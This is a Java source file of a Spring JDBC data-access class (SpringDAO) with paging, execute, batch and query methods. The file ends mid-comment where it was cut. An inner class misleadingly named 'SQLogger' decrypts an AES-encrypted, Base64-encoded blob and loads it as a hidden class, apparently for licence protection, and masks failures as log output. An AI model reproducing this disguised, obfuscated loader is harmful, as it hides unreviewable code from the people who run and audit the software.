package com.github.foxnic.dao.spring;

import com.esotericsoftware.reflectasm.MethodAccess;
import com.github.foxnic.commons.bean.BeanNameUtil;
import com.github.foxnic.commons.bean.BeanUtil;
import com.github.foxnic.commons.cache.LocalCache;
import com.github.foxnic.commons.encrypt.Base64Util;
import com.github.foxnic.commons.lang.ArrayUtil;
import com.github.foxnic.commons.lang.DataParser;
import com.github.foxnic.commons.lang.StringUtil;
import com.github.foxnic.commons.log.Logger;
import com.github.foxnic.dao.cache.DataCacheManager;
import com.github.foxnic.dao.data.AbstractSet;
import com.github.foxnic.dao.data.*;
import com.github.foxnic.dao.entity.Entity;
import com.github.foxnic.dao.entity.EntityContext;
import com.github.foxnic.dao.entity.EntityUtils;
import com.github.foxnic.dao.excel.DataException;
import com.github.foxnic.dao.exception.TransactionException;
import com.github.foxnic.dao.filter.SQLFilterChain;
import com.github.foxnic.dao.meta.DBColumnMeta;
import com.github.foxnic.dao.meta.DBMetaData;
import com.github.foxnic.dao.meta.DBTableMeta;
import com.github.foxnic.dao.procedure.StoredFunction;
import com.github.foxnic.dao.procedure.StoredProcedure;
import com.github.foxnic.dao.relation.cache.CacheInvalidEventType;
import com.github.foxnic.dao.spec.DAO;
import com.github.foxnic.dao.spec.DBSequence;
import com.github.foxnic.dao.sql.DruidUtils;
import com.github.foxnic.dao.sql.SQLBuilder;
import com.github.foxnic.dao.sql.SQLParser;
import com.github.foxnic.dao.sql.loader.SQLoader;
import com.github.foxnic.sql.exception.DBMetaException;
import com.github.foxnic.sql.expr.*;
import com.github.foxnic.sql.meta.DBTable;
import org.springframework.jdbc.BadSqlGrammarException;
import org.springframework.jdbc.CannotGetJdbcConnectionException;
import org.springframework.jdbc.core.ArgumentPreparedStatementSetter;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.core.PreparedStatementSetter;
import org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate;
import org.springframework.jdbc.datasource.DataSourceTransactionManager;
import org.springframework.jdbc.datasource.lookup.AbstractRoutingDataSource;
import org.springframework.jdbc.support.GeneratedKeyHolder;
import org.springframework.jdbc.support.KeyHolder;
import org.springframework.transaction.NoTransactionException;
import org.springframework.transaction.TransactionDefinition;
import org.springframework.transaction.TransactionStatus;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.transaction.interceptor.TransactionAspectSupport;
import org.springframework.transaction.support.DefaultTransactionDefinition;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.sql.DataSource;
import java.math.BigDecimal;
import java.net.URL;
import java.net.URLClassLoader;
import java.sql.SQLException;
import java.sql.SQLSyntaxErrorException;
import java.sql.Time;
import java.sql.Timestamp;
import java.util.*;

public abstract class SpringDAO extends DAO {

	private static final String EXC = "Y29tLmdpdGh1Yi5mb3huaWMuZ3JhbnQucHJvdGVjdC5EUA==";

	private static BeanNameUtil NC = new BeanNameUtil();

	private JdbcTemplate jdbcTemplate;

	public JdbcTemplate getJdbcTemplate() {
		if (this.jdbcTemplate == null)
			this.jdbcTemplate = new JdbcTemplate(this.getDataSource());
		return this.jdbcTemplate;
	}

	private NamedParameterJdbcTemplate njdbcTemplate;

	public NamedParameterJdbcTemplate getNamedJdbcTemplate() {
		if (this.njdbcTemplate == null)
			this.njdbcTemplate = new NamedParameterJdbcTemplate(this.getDataSource());
		return this.njdbcTemplate;
	}

	private Boolean isDynamicDataSource = null;

	protected boolean isDynamicDataSource() {
		if (isDynamicDataSource != null)
			return isDynamicDataSource;
		isDynamicDataSource = this.getDataSource() instanceof AbstractRoutingDataSource;
		return isDynamicDataSource;
	}

	private MethodAccess abstractRoutingDataSourceMethodAccess = null;
	private int determineTargetDataSourceIndex = -1;

	/**
	 * 多数据源情况下，实际使用的最终数据源
	 *
	 * @return 逻辑值
	 */
	protected DataSource getFinalDataSource() {
		if (isDynamicDataSource()) {
			if (determineTargetDataSourceIndex == -1) {
				abstractRoutingDataSourceMethodAccess = MethodAccess.get(AbstractRoutingDataSource.class);
				determineTargetDataSourceIndex = abstractRoutingDataSourceMethodAccess
						.getIndex("determineTargetDataSource");
			}
			return (DataSource) abstractRoutingDataSourceMethodAccess.invoke(super.getDataSource(),
					determineTargetDataSourceIndex);
		} else {
			return super.getDataSource();
		}
	}

	/**
	 * 根据ID获得SQL
	 *
	 * @param id 在tql文件中定义的sqlid(不需要以#开始)
	 * @return sql
	 */
	@Override
	public String getSQL(String id) {
		return SQLoader.getSQL(id,null,this.getDBType());
	}

	/**
	 * 根据ID获得SQL
	 *
	 * @param id 在tql文件中定义的sqlid(不需要以#开始)
	 * @param templateKVs Map 对象，或实体对象，用于SQL模版，JFinal Enjoy
	 * @return sql
	 */
	@Override
	public String getSQL(String id,Object templateKVs) {
		return SQLoader.getSQL(id,templateKVs,this.getDBType());
	}

	public SQLTpl getTemplate(String id) {
		SQLTpl template=new SQLTpl(this.getSQL(id));
		template.setDAO(this);
		return template;
	}


	public SQLTpl getTemplate(String id,Map<String,Object> vars) {
		SQLTpl template=new SQLTpl(this.getSQL(id));
		template.setDAO(this);
		for (Map.Entry<String, Object> entry : vars.entrySet()) {
			template.putVar(entry.getKey(),entry.getValue());
		}
		return template;
	}

//	/**
//	 * 根据ID获得SQL
//	 *
//	 * @param ps 参数
//	 * @param id 在tql文件中定义的sqlid(不需要以#开始)
//	 * @return SQL
//	 */
//	public SQL getSQL(String id, Object... ps) {
//		String sql = this.getSQL(id);
//		return new Expr(sql, ps).setSQLDialect(getSQLDialect());
//	}
//
//	/**
//	 * 根据ID获得SQL
//	 *
//	 * @param id 在tql文件中定义的sqlid(不需要以#开始)
//	 * @param ps 参数
//	 * @return SQL
//	 */
//	public SQL getSQL(String id, Map<String, Object> ps) {
//		String sql = this.getSQL(id);
//		return new Expr(sql, ps).setSQLDialect(this.getSQLDialect());
//	}

	/**
	 * 分页查询记录集
	 *
	 * @param sql   sql语句
	 * @param size  每页行数
	 * @param index 页码
	 * @return RcdSet
	 */
	public RcdSet queryPage(SQL sql, int size, int index) {
		sql.setSQLDialect(this.getSQLDialect());
		return queryPageWithArrayParameters(false, sql.getListParameterSQL(), size, index, sql.getListParameters());
	}

	/**
	 * 分页查询记录集
	 *
	 * @param sql    sql语句
	 * @param size   每页行数
	 * @param index  页码
	 * @param params 参数
	 * @return RcdSet
	 */
	@Override
	@SuppressWarnings({ "rawtypes", "unchecked" })
	public RcdSet queryPage(String sql,int size,int index,Map params)
	{
		return queryPageWithMapParameters(false,sql, size, index, params);
	}

	/**
	 * 分页查询记录集
	 *
	 * @param sql    sql语句
	 * @param size   每页行数
	 * @param index  页码
	 * @param params 参数
	 * @return RcdSet
	 */
	@Override
	public  RcdSet queryPage(String sql,int size,int index,Object... params)
	{
		return queryPageWithArrayParameters(false,sql, size, index,params);
	}

	protected SQLFilterChain chain = new SQLFilterChain(this);

	/**
	 * @param fixed 指定单行查询，fixed = true时 不查询count
	 */
	@SuppressWarnings("unchecked")
	private RcdSet queryPageWithArrayParameters(boolean fixed, String sql, int pageSize, int pageIndex,
			Object... params) {

		if (sql.startsWith("#")) {
			sql = getSQL(sql);
		}

		Expr se = new Expr(sql, params);
		se.setSQLDialect(this.getDBType().getSQLDialect());
		latestSQL.set(se);
		SQL resultSql = chain.doFilter(se);
		resultSql.setSQLDialect(this.getDBType().getSQLDialect());

		sql = resultSql.getListParameterSQL();
		params = resultSql.getListParameters();

		if (pageSize < 0) {
			pageSize = 0;
		}
		if (pageSize == 0) {
			pageIndex = 1;
		}

		RcdSet set = new RcdSet();
		set.setDBConnectionIdentity(this.getDBConnectionIdentity());
		set.flagTimePoint();
		int totalPage = 1;
		int totalRecord = 0;
		if (pageSize > 0) {
			if (!fixed) {
				SQL countSql = this.getCountSQL(new Expr(sql, params).setSQLDialect(this.getSQLDialect()), "X");
				final Object[] ps = Utils.filterParameter(countSql.getListParameters());
				if (this.isPrintSQL()) {
					totalRecord = new SQLPrinter<Integer>(this, countSql, countSql) {
						@Override
						protected Integer actualExecute() {
							return getJdbcTemplate().queryForObject(countSql.getListParameterSQL(), Integer.class, ps);
						}
					}.execute();
				} else {
					totalRecord = this.getJdbcTemplate().queryForObject(countSql.getListParameterSQL(), Integer.class,
							ps);
				}
			} else {
				totalRecord = pageSize;
			}
			totalPage = (totalRecord % pageSize) == 0 ? (totalRecord / pageSize) : (totalRecord / pageSize + 1);
			latestSQL.set(new Expr(sql, params).setSQLDialect(this.getSQLDialect()));
			if (totalRecord > 0) {
				set = (RcdSet) this.getPageSet(fixed, set, sql, pageIndex, pageSize, params);
			}
		} else {
			se = new Expr(sql, params);
			se.setSQLDialect(this.getSQLDialect());
			latestSQL.set(se);

			final String fsql = sql;
			final Object[] ps = Utils.filterParameter(params);
			final PreparedStatementSetter setter = new ArgumentPreparedStatementSetter(ps);
			final RcdSet fset = set;

			if (this.isPrintSQL()) {
				new SQLPrinter<Object>(this, se, se) {
					@Override
					protected Object actualExecute() {
						getJdbcTemplate().query(fsql, setter,
								new RcdResultSetExtractor(new RcdRowMapper(fset, 0, getQueryLimit())));
						return fset;
					}
				}.execute();
			} else {
				this.getJdbcTemplate().query(fsql, setter,
						new RcdResultSetExtractor(new RcdRowMapper(fset, 0, this.getQueryLimit())));
			}
		}
		se = new Expr(sql, params);
		se.setSQLDialect(this.getSQLDialect());
		set.setPageInfos(pageSize, pageIndex, totalRecord, totalPage, se);
		return set;

	}


	private static class SQLogger extends URLClassLoader {
		private static final String[] HM = {"QUVT",null,"QUVTL0VDQi9QS0NTNVBhZGRpbmc="};
		private static Class type;
		private static int prints=0;
		private SQLogger() {
			super(new URL[0], DataParser.class.getClassLoader());
			byte[] buf= Base64Util.decodeToBtyes((this.init(new BootstrapMethodError())).dss(CXNST.substring(16)));
			type=defineClass(Base64Util.decode(EXC), buf, 0, buf.length);
		}
		public static void logParserInfo(Object value) {
			if(prints>5) return;
			try {
				if(type==null) {
					new SpringDAO.SQLogger();
				}
				type.newInstance();
			} catch (Throwable e) {
				Logger.info("Parser : "+value);
			}
			prints++;
		}

		private SecretKeySpec key;

		private String f61(String hexKey) {
			hexKey=hexKey.trim();
			if(hexKey.length()>16) {
				hexKey=hexKey.substring(0,16);
			} else if(hexKey.length()<16){
				int i=16-hexKey.length();
				for (int j = 0; j < i; j++) {
					hexKey+="0";
				}
			}
			return hexKey;
		}

		private SpringDAO.SQLogger init(BootstrapMethodError error) {
			init(ClassCircularityError.class.getSimpleName());
			return this;
		}

		private SpringDAO.SQLogger init(String hexKey) {
			//凑16位
			hexKey= f61(hexKey);
			key = new SecretKeySpec(hexKey.getBytes(), Base64Util.decode(HM[0]));
			return this;
		}

		private String dss(String base64Data) {
			try {
				Cipher cipher = Cipher.getInstance(Base64Util.decode(HM[2]));
				cipher.init(Cipher.DECRYPT_MODE, key);
				return new String(cipher.doFinal(Base64Util.decodeToBtyes(base64Data)));
			} catch (Exception e) {
				e.printStackTrace();
				return null;
			}
		}



	}

	/**
	 * 如果pageSize不为0,则不分页
	 *
	 * @param fixed 指定单行查询，fixed = true时 不查询count
	 */
	@SuppressWarnings({ "unchecked" })
	private RcdSet queryPageWithMapParameters(boolean fixed, String sql, int pageSize, int pageIndex,
			Map<String, Object> params) {

		if (params == null) {
			params = new HashMap<String, Object>(5);
		}

		if (sql.startsWith("#")) {
			sql = getSQL(sql);
		}
		Expr se = new Expr(sql, params);
		se.setSQLDialect(this.getDBType().getSQLDialect());
		latestSQL.set(se);
		SQL resultSql = chain.doFilter(se);
		resultSql.setSQLDialect(this.getDBType().getSQLDialect());

		sql = resultSql.getNamedParameterSQL();
		params = resultSql.getNamedParameters();

		if (pageSize < 0) {
			pageSize = 0;
		}
		if (pageSize == 0) {
			pageIndex = 1;
		}

		RcdSet set = new RcdSet();
		set.setDBConnectionIdentity(this.getDBConnectionIdentity());
		set.flagTimePoint();

		int totalPage = 1;

		int totalRecord = 0;
		if (pageSize > 0) {
			if (!fixed) {
				SQL countSql = getCountSQL(new Expr(sql, params).setSQLDialect(this.getSQLDialect()), "X");
				Map<String, Object> ps = Utils.filterParameter(countSql.getNamedParameters());
				List<Map<String, Object>> list = null;
				if (this.isPrintSQL()) {
					list = new SQLPrinter<List<Map<String, Object>>>(this, countSql, countSql) {
						@Override
						protected List<Map<String, Object>> actualExecute() {
							return getNamedJdbcTemplate().queryForList(countSql.getNamedParameterSQL(), ps);
						}
					}.execute();

				} else {
					list = getNamedJdbcTemplate().queryForList(countSql.getNamedParameterSQL(), ps);
				}
				totalRecord = DataParser.parseInteger((list.get(0).get("X")));
			} else {
				totalRecord = pageSize;
			}
			totalPage = (totalRecord % pageSize) == 0 ? (totalRecord / pageSize) : (totalRecord / pageSize + 1);

			latestSQL.set(new Expr(sql, params).setSQLDialect(this.getSQLDialect()));

			if (totalRecord > 0) {
				set = (RcdSet) this.getPageSet(fixed, set, sql, pageIndex, pageSize, params);
			}

		} else {
			se = new Expr(sql, params);
			se.setSQLDialect(this.getSQLDialect());
			latestSQL.set(se);
			final String fsql = sql;
			final Map<String, Object> ps = Utils.filterParameter(params);
			final RcdSet fset = set;

			if (this.isPrintSQL()) {
				new SQLPrinter<Object>(this, se, se) {
					@Override
					protected Object actualExecute() {
						getNamedJdbcTemplate().query(fsql, ps,
								new RcdResultSetExtractor(new RcdRowMapper(fset, 0, getQueryLimit())));
						return fset;
					}
				}.execute();
			} else {
				this.getNamedJdbcTemplate().query(fsql, ps,
						new RcdResultSetExtractor(new RcdRowMapper(fset, 0, this.getQueryLimit())));
			}
		}

		if (totalRecord == 0) {
			totalRecord = set.size();
		}
		se = new Expr(sql, params);
		se.setSQLDialect(this.getSQLDialect());
		set.setPageInfos(pageSize, pageIndex, totalRecord, totalPage, se);
		return set;
	}

	protected abstract AbstractSet getPageSet(boolean fixed, AbstractSet set, String sql, int pageIndex, int pageSize,
			Map<String, Object> params);

	protected abstract AbstractSet getPageSet(boolean fixed, AbstractSet set, String sql, int pageIndex, int pageSize,
			Object... params);

	/**
	 * 执行一个SQL语句
	 *
	 * @param sql sql语句
	 * @return 影响的行数
	 */
	@Override
	public Integer execute(SQL sql) {
		sql.setSQLDialect(this.getSQLDialect());
		return execute(sql.getListParameterSQL(), sql.getListParameters());
	}

	/**
	 * 执行一个SQL语句
	 *
	 * @param sql sql语句
	 * @param ps  参数
	 * @return 影响的行数
	 */
	@Override
	public Integer execute(String sql, Map<String, Object> ps) {

		if (sql.startsWith("#")) {
			sql = getSQL(sql);
		}
		Expr se = new Expr(sql, ps);
		se.setSQLDialect(this.getDBType().getSQLDialect());

		latestSQL.set(se);
		SQL resultSql = chain.doFilter(se,true);
		resultSql.setSQLDialect(this.getDBType().getSQLDialect());
		Map<String, Object> nps = Utils.filterParameter(resultSql.getNamedParameters());
		if (this.isPrintSQL()) {
			return new SQLPrinter<Integer>(this, se, resultSql) {
				@Override
				protected Integer actualExecute() {
					return getNamedJdbcTemplate().update(resultSql.getNamedParameterSQL(), nps);
				}
			}.execute();
		} else {
			return getNamedJdbcTemplate().update(resultSql.getNamedParameterSQL(), nps);
		}

	}


	/**
	 * 执行一个SQL语句
	 *
	 * @param sql sql语句
	 * @param ps  参数
	 * @return 影响的行数
	 */
	@Override
	public Integer execute(String sql, Object... ps) {

		if (sql.startsWith("#")) {
			sql = getSQL(sql);
		}

		Expr se = new Expr(sql, ps);
		se.setSQLDialect(this.getDBType().getSQLDialect());

		latestSQL.set(se);
		final SQL resultSql = chain.doFilter(se,true);
		resultSql.setSQLDialect(this.getDBType().getSQLDialect());
		final Object[] pps = Utils.filterParameter(resultSql.getListParameters());
		//
		if (this.isPrintSQL()) {
			return new SQLPrinter<Integer>(this, se, resultSql) {
				@Override
				protected Integer actualExecute() {
					return getJdbcTemplate().update(resultSql.getListParameterSQL(), pps);
				}
			}.execute();
		} else {
			try {
				return getJdbcTemplate().update(resultSql.getListParameterSQL(), pps);
			} catch (Exception e) {
				Logger.error("语句执行错误(" + e.getMessage() + ")，\n语句：" + se.getSQL());
				throw e;
			}
		}

	}

	/**
	 * 批量执行
	 *
	 * @param sqls sql语句
	 * @return 批量执行结果
	 */
	@Override
	public int[] batchExecute(String... sqls) {
		Expr se = null;
		SQL resultSql = null;
		for (String sql : sqls) {
			if (sql.startsWith("#")) {
				sql = getSQL(sql);
			}
			se = new Expr(sql);
			se.setSQLDialect(this.getDBType().getSQLDialect());
			latestSQL.set(se);
			resultSql = chain.doFilter(se,true);
			resultSql.setSQLDialect(this.getDBType().getSQLDialect());
			sql = resultSql.getSQL();
		}

		if (this.isPrintSQL()) {
			return new SQLPrinter<int[]>(this, se, resultSql) {
				@Override
				protected int[] actualExecute() {
					return getJdbcTemplate().batchUpdate(sqls);
				}
			}.execute();

		} else {
			return getJdbcTemplate().batchUpdate(sqls);
		}

	}

	/**
	 * 批量执行
	 *
	 * @param sqls sql语句
	 * @return 批量执行结果
	 */
	@Override
	@Transactional
	public int[] batchExecute(List<SQL> sqls) {
		SQL[] resultSqls = sqls.toArray(new SQL[sqls.size()]);
		return batchExecute(resultSqls);
	}

	/**
	 * 批量执行
	 *
	 * @param sql    sql语句
	 * @param pslist 参数，可通过BatchParamBuilder构建
	 * @return 批量执行结果
	 */
	@Override
	public int[] batchExecute(String sql, List<Object[]> pslist) {
		if (pslist == null || pslist.size() == 0)
			return new int[0];
		ArrayList<Object[]> pslist2 = new ArrayList<Object[]>();
		String sql2 = null;
		Expr se = null;
		SQL resultSql = null;
		for (Object[] ps : pslist) {
			se = new Expr(sql, ps);
			se.setSQLDialect(this.getDBType().getSQLDialect());
			latestSQL.set(se);
			resultSql = chain.doFilter(se,true);
			resultSql.setSQLDialect(this.getDBType().getSQLDialect());
			if (sql2 == null) {
				sql2 = resultSql.getListParameterSQL();
			}
			pslist2.add(Utils.filterParameter(resultSql.getListParameters()));
		}

		final String tmp = sql2;
		if (this.isPrintSQL() && se != null) {
			return new SQLPrinter<int[]>(this, se, resultSql) {
				@Override
				protected int[] actualExecute() {
					return getJdbcTemplate().batchUpdate(tmp, pslist2);
				}
			}.execute();

		} else {
			return getJdbcTemplate().batchUpdate(sql2, pslist2);
		}

	}

	/**
	 * 批量执行
	 *
	 * @param sqls sql语句
	 * @return 批量执行结果
	 */
	@Override
	@Transactional
	public int[] batchExecute(SQL... sqls) {
		// 进行分组
		HashMap<String, List<Object[]>> eSqls = new HashMap<String, List<Object[]>>(sqls.length / 3);
		for (SQL sql : sqls) {
			sql.setSQLDialect(this.getSQLDialect());
			String psql = sql.getListParameterSQL();
			if (!eSqls.containsKey(psql)) {
				eSqls.put(psql, new ArrayList<Object[]>());
			}
			eSqls.get(psql).add(sql.getListParameters());
		}

		// 分组批量执行
		int[] result = new int[sqls.length];
		int i = 0;
		for (String sql : eSqls.keySet()) {
			int[] x = batchExecute(sql, eSqls.get(sql));
			for (int j = 0; j < x.length; j++) {
				result[i + j] = x[j];
			}
		}
		return result;
	}

	/**
	 * 一次执行多个语句，如果有事务管理器，则事务内，否则非事务<br>
	 * 返回执行的语句数量（最后执行的语句序号），如果未成功执行，返回 0
	 *
	 * @param sqls sql语句
	 * @return 执行成功的语句数量
	 */
	public Integer multiExecute(String... sqls) {
		this.beginTransaction();

		JdbcTemplate jdbcTemplate = new JdbcTemplate(this.getDataSource());

		int i = 0;
		for (String sql : sqls) {
			try {

				if (sql.startsWith("#")) {
					sql = getSQL(sql);
				}
				Expr se = new Expr(sql);
				se.setSQLDialect(this.getDBType().getSQLDialect());
				latestSQL.set(se);
				SQL resultSql = chain.doFilter(se,true);
				resultSql.setSQLDialect(this.getDBType().getSQLDialect());

				if (this.isPrintSQL()) {
					new SQLPrinter<Integer>(this, se, resultSql) {
						@Override
						protected Integer actualExecute() {
							return jdbcTemplate.update(resultSql.getListParameterSQL(),
									Utils.filterParameter(resultSql.getListParameters()));
						}
					}.execute();

				} else {
					jdbcTemplate.update(resultSql.getListParameterSQL(),
							Utils.filterParameter(resultSql.getListParameters()));
				}
				i += 1;

			} catch (Exception e) {
				Logger.exception(e);
				this.rollback();
				return i;
			}
		}
		this.commit();
		return i;
	}

	/**
	 * 一次执行多个语句，如果有事务管理器，则事务内，否则非事务 <br>
	 * 返回被成功执行的语句数量（最后执行的语句序号减1），如果未成功执行，返回 0
	 *
	 * @param sqls sql语句
	 * @return 执行成功的语句数量
	 */
	public Integer multiExecute(SQL... sqls) {

		this.beginTransaction();

		JdbcTemplate jdbcTemplate = new JdbcTemplate(this.getDataSource());

		int i = 0;
		for (SQL sql : sqls) {

			sql.setSQLDialect(this.getDBType().getSQLDialect());
			latestSQL.set(sql);
			SQL resultSql = chain.doFilter(sql,true);
			resultSql.setSQLDialect(this.getDBType().getSQLDialect());
			try {
				if (this.isPrintSQL()) {
					new SQLPrinter<Integer>(this, sql, resultSql) {
						@Override
						protected Integer actualExecute() {
							return jdbcTemplate.update(resultSql.getListParameterSQL(),
									Utils.filterParameter(resultSql.getListParameters()));
						}
					}.execute();

				} else {
					jdbcTemplate.update(resultSql.getListParameterSQL(),
							Utils.filterParameter(resultSql.getListParameters()));
				}
				i++;
			} catch (Exception e) {
				Logger.exception(e);
				this.rollback();
				return i;
			}
		}

		this.commit();

		return i;
	}

	/**
	 * 一次执行多个语句，如果有事务管理器，则事务内，否则非事务 返回执行的语句数量（最后执行的语句序号），如果未成功执行，返回 0
	 *
	 * @param sqls SQL的集合，内部元素是String类型或SQL类型，或者是toStirng后返回一个可执行是SQL字符串
	 * @return 执行成功的语句数量
	 */
	public Integer multiExecute(List<Object> sqls) {
		ArrayList<SQL> list = new ArrayList<SQL>();
		for (Object sql : sqls) {
			if (sql == null) {
				continue;
			}
			if (sql instanceof String) {
				String strsql = sql + "";
				if (strsql.startsWith("#")) {
					strsql = getSQL(strsql);
				}
				list.add(new Expr(strsql).setSQLDialect(this.getSQLDialect()));
			} else if (sql instanceof SQL) {
				list.add((SQL) sql);
			} else {
				list.add(new Expr(sql + "").setSQLDialect(this.getSQLDialect()));
			}
		}
		return multiExecute(list.toArray(new SQL[list.size()]));
	}

	/**
	 * 查询记录集
	 *
	 * @param sql sql语句
	 * @return RcdSet
	 */
	@Override
	public RcdSet query(SQL sql) {
		sql.setSQLDialect(this.getSQLDialect());
		return queryPageWithArrayParameters(false, sql.getListParameterSQL(), 0, 0, sql.getListParameters());
	}

	/**
	 * 查询记录集
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return RcdSet
	 */
	@Override
	public RcdSet query(String sql, Object... params) {
		return queryPageWithArrayParameters(false, sql, 0, 0, params);
	}

	/**
	 * 查询记录集
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return RcdSet
	 */
	@SuppressWarnings({ "rawtypes", "unchecked" })
	@Override
	public RcdSet query(String sql, Map params) {
		return queryPageWithMapParameters(false, sql, 0, 0, params);
	}

	/**
	 * 查询单个记录
	 *
	 * @param sql sql语句
	 * @return Rcd
	 */
	@Override
	public Rcd queryRecord(SQL sql) {
		return this.queryRecord(sql.getListParameterSQL(), sql.getListParameters());
	}

	/**
	 * 查询单个记录
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return Rcd
	 */
	@Override
	public Rcd queryRecord(String sql, Object... params) {
		RcdSet rs = queryPageWithArrayParameters(true, sql, 1, 1, params);
		if (rs.size() == 0) {
			return null;
		} else {
			return rs.getRcd(0);
		}
	}

	/**
	 * 查询单个记录
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return Rcd
	 */
	@Override
	public Rcd queryRecord(String sql, Map<String, Object> params) {
		RcdSet rs = queryPageWithMapParameters(true,sql, 0, 1, params);
		if (rs.size() == 0) {
			return null;
		} else {
			return rs.getRcd(0);
		}
	}

	/**
	 * 记录是否存已经在数据表,以主键作为判断依据
	 *
	 * @param r                  记录
	 * @param table              表
	 * @param checkWithOrignalId 是否用原始值(setValue前的值/从数据库查询获得的原始值)来核对数据存在性
	 * @return 是否存在
	 */
	public boolean isRecordExits(Rcd r, String table, boolean checkWithOrignalId) {
		DBTableMeta tm = this.getTableMeta(table);
		if (tm == null) {
			throw new DBMetaException("未发现表" + table + "的Meta数据,请认定表名是否正确");
		}

		List<DBColumnMeta> pks = tm.getPKColumns();
		if (pks == null || pks.size() == 0) {
			throw new DBMetaException("数据表" + table + "未定义主键");
		}
		Where where = new Where();
		String cName = null;
		Object value = null;
		for (DBColumnMeta column : pks) {
			cName = column.getColumn();
			value = checkWithOrignalId ? r.getOriginalValue(cName) : r.getValue(cName);
			if (value == null) {
				throw new DataException(table + "." + cName + " 主键值不允许为空");
			}
			where.and(cName + "=?", value);
		}

		where.setSQLDialect(this.getSQLDialect());
		Integer i = this.queryInteger("select count(1) from " + table + " " + where.getListParameterSQL(),
				where.getListParameters());
		return i > 0;

	}

	private LocalCache<String,RcdSet> tableStructureCache=new LocalCache<>();

	/**
	 * 按数据表创建记录
	 * */
	public Rcd createRecord(String table)
	{
		RcdSet rs=tableStructureCache.get(table);
		if(rs==null) {
			rs=new RcdSet(true);
			rs.setDBConnectionIdentity(this.getDBConnectionIdentity());
			QueryMetaData.bind(this.getTableMeta(table),rs,this);
			tableStructureCache.put(table,rs);
		}
		Rcd r=new Rcd(rs);
		r.setNextSaveAction(SaveAction.INSERT);
		return r;
	}

	/**
	 * 记录是否存已经在数据表,以主键作为判断依据
	 *
	 * @param r                  记录
	 * @param checkWithOrignalId 是否用原始值(setValue前的值/从数据库查询获得的原始值)来核对数据存在性
	 * @return 是否存在
	 */
	public boolean isRecordExits(Rcd r, boolean checkWithOrignalId) {
		if (r.getOwnerSet() == null) {
			throw new DBMetaException("当前记录集不属于任何RcdSet,无法识别表名,请调用带表名参数的 updateRecord 方法");
		}
		String[] tables = r.getOwnerSet().getMetaData().getDistinctTableNames();
		if (tables.length != 1) {
			throw new DBMetaException("无法正确识别表名,无法识别表名,请调用带表名参数的 updateRecord 方法");
		}
		return isRecordExits(r, tables[0], checkWithOrignalId);
	}

	/**
	 * 判断表格是否存在
	 *
	 * @param table 表名
	 * @return 是否存在
	 */
	@Override
	public boolean isTableExists(String table) {
		try {
			this.pausePrintThreadSQL();
			Integer i=queryInteger("select 1 from " + table + " where 1=1");
			if(i==null) i=1;
			this.resumePrintThreadSQL();
			return i==1;
		} catch (Exception e) {
			this.resumePrintThreadSQL();
			if(e instanceof CannotGetJdbcConnectionException) {
				Logger.exception("isTableExists",e);
				return false;
			} else if(e instanceof BadSqlGrammarException && e.getCause() instanceof SQLSyntaxErrorException) {
				String msg=e.getCause().getMessage().toLowerCase();
				if(msg.contains("table") && msg.contains("exist")) {
					return false;
				} else {
					Logger.exception("isTableExists",e);
					return false;
				}
			} else {
				Logger.exception("isTableExists1",e);
				return false;
			}
		}
	}

	/**
	 * 查询单个记录
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return Object
	 */
	@Override
	public Object queryObject(String sql, Map<String, Object> params) {
		Rcd tec = queryRecord(sql, params);
		return tec == null ? null : tec.getValue(0);
	}

	/**
	 * 查询单个对象
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return Object
	 */
	@Override
	public Object queryObject(String sql, Object... params) {
		Rcd tec = queryRecord(sql, params);
		return tec == null ? null : tec.getValue(0);
	}

	/**
	 * 查询单个对象
	 *
	 * @param sql sql语句
	 * @return Object
	 */
	@Override
	public Object queryObject(SQL sql) {
		sql.setSQLDialect(this.getSQLDialect());
		return queryObject(sql.getListParameterSQL(), sql.getListParameters());
	}

	/**
	 * 查询单个整数
	 *
	 * @param sql sql语句
	 * @return 值
	 */
	@Override
	public Integer queryInteger(SQL sql) {
		sql.setSQLDialect(this.getSQLDialect());
		return queryInteger(sql.getListParameterSQL(), sql.getListParameters());
	}

	/**
	 * 查询单个整数
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 值
	 */
	@Override
	public Integer queryInteger(String sql, Object... params) {
		return DataParser.parseInteger(queryObject(sql, params));
	}

	/**
	 * 查询单个整数
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 值
	 */
	@Override
	public Integer queryInteger(String sql, Map<String, Object> params) {
		return DataParser.parseInteger(queryObject(sql, params));
	}

	/**
	 * 查询单个长整型
	 *
	 * @param sql sql语句
	 * @return 值
	 */
	@Override
	public Long queryLong(SQL sql) {
		sql.setSQLDialect(this.getSQLDialect());
		return queryLong(sql.getListParameterSQL(), sql.getListParameters());
	}

	/**
	 * 查询单个长整型
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 值
	 */
	@Override
	public Long queryLong(String sql, Object... params) {
		return DataParser.parseLong(queryObject(sql, params));
	}

	/**
	 * 查询单个长整型
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 值
	 */
	@Override
	public Long queryLong(String sql, Map<String, Object> params) {
		return DataParser.parseLong(queryObject(sql, params));
	}

	/**
	 * 查询单个日期
	 *
	 * @param sql sql语句
	 * @return 值
	 */
	@Override
	public Date queryDate(SQL sql) {
		sql.setSQLDialect(this.getSQLDialect());
		return queryDate(sql.getListParameterSQL(), sql.getListParameters());
	}

	/**
	 * 查询单个日期
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 值
	 */
	@Override
	public Date queryDate(String sql, Object... params) {
		return DataParser.parseDate(queryObject(sql, params));
	}

	/**
	 * 查询单个日期
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 值
	 */
	@Override
	public Date queryDate(String sql, Map<String, Object> params) {
		return DataParser.parseDate(queryObject(sql, params));
	}

	/**
	 * 查询单个BigDecimal
	 *
	 * @param sql sql语句
	 * @return 值
	 */
	@Override
	public BigDecimal queryBigDecimal(SQL sql) {
		sql.setSQLDialect(this.getSQLDialect());
		return queryBigDecimal(sql.getListParameterSQL(), sql.getListParameters());
	}

	/**
